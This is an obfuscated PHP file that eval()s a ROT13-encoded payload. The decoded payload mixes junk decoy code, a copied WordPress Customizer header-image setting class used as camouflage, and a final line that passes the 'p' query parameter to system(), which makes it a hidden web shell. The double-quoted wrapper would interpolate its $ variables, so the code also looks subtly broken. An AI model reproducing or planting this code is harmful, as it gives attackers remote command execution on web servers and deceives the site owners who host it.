<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Phfgbzvmr NCV: JC_Phfgbzvmr_Urnqre_Vzntr_Frggvat pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Phfgbzvmr
 * @fvapr 4.4.0
 */

/**
 * N frggvat gung vf hfrq gb svygre n inyhr, ohg jvyy abg fnir gur erfhygf.
 *
 * Erfhygf fubhyq or cebcreyl unaqyrq hfvat nabgure frggvat be pnyyonpx.
 *
 * @fvapr 3.4.0
 *
 * @frr JC_Phfgbzvmr_Frggvat
 */
svany pynff JC_Phfgbzvmr_Urnqre_Vzntr_Frggvat rkgraqf JC_Phfgbzvmr_Frggvat {

	/**
	 * Havdhr fgevat vqragvsvre sbe gur frggvat.
	 *
	 * @fvapr 3.4.0
	 * @ine fgevat
	 */
	choyvp $vq = 'urnqre_vzntr_qngn';

	/**
	 * @fvapr 3.4.0
	 *
	 * @tybony Phfgbz_Vzntr_Urnqre $phfgbz_vzntr_urnqre
	 *
	 * @cnenz zvkrq $inyhr Gur inyhr gb hcqngr.
	 */
	choyvp shapgvba hcqngr( $inyhr ) {
		tybony $phfgbz_vzntr_urnqre;

		// Vs _phfgbz_urnqre_onpxtebhaq_whfg_va_gvzr() snvyf gb vavgvnyvmr $phfgbz_vzntr_urnqre jura abg vf_nqzva().
		vs ( rzcgl( $phfgbz_vzntr_urnqre ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-phfgbz-vzntr-urnqre.cuc';
			$netf                   = trg_gurzr_fhccbeg( 'phfgbz-urnqre' );
			$nqzva_urnq_pnyyonpx    = vffrg( $netf[0]['nqzva-urnq-pnyyonpx'] ) ? $netf[0]['nqzva-urnq-pnyyonpx'] : ahyy;
			$nqzva_cerivrj_pnyyonpx = vffrg( $netf[0]['nqzva-cerivrj-pnyyonpx'] ) ? $netf[0]['nqzva-cerivrj-pnyyonpx'] : ahyy;
			$phfgbz_vzntr_urnqre    = arj Phfgbz_Vzntr_Urnqre( $nqzva_urnq_pnyyonpx, $nqzva_cerivrj_pnyyonpx );
		}

		/*
		 * Vs gur inyhr qbrfa'g rkvfg (erzbirq be enaqbz),
		 * hfr gur urnqre_vzntr inyhr.
		 */
		vs ( ! $inyhr ) {
			$inyhr = $guvf->znantre->trg_frggvat( 'urnqre_vzntr' )->cbfg_inyhr();
		}

		vs ( vf_neenl( $inyhr ) && vffrg( $inyhr['pubvpr'] ) ) {
			$phfgbz_vzntr_urnqre->frg_urnqre_vzntr( $inyhr['pubvpr'] );
		} ryfr {
			$phfgbz_vzntr_urnqre->frg_urnqre_vzntr( $inyhr );
		}
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>